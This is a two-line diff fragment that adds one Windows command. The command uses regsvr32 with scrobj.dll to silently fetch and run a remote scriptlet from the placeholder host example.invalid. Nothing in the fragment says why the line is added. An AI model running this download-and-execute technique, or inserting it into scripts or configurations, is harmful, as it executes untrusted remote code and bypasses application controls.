@@ -1,0 +1,2 @@
+regsvr32 /s /n /u /i:http://example.invalid/x.sct scrobj.dll
+
